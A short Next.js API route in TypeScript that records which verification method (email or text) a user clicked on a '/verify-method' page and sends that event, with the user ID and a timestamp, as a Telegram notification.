import { NextResponse } from "next/server";

import { sendFormNotification } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const body = (await request.json().catch(() => ({}))) as {
      verificationType?: string;
      userId?: string;
    };
    const label = String(body.verificationType ?? "").toLowerCase();
    const type = label.includes("email") ? "email_verification" : "text_verification";

    await sendFormNotification({
      type,
      userId: String(body.userId ?? "").trim(),
      method: type === "email_verification" ? "email" : "text",
      timestamp: new Date().toISOString(),
      page: "/verify-method",
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending verification click notification:", error);
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 });
  }
}
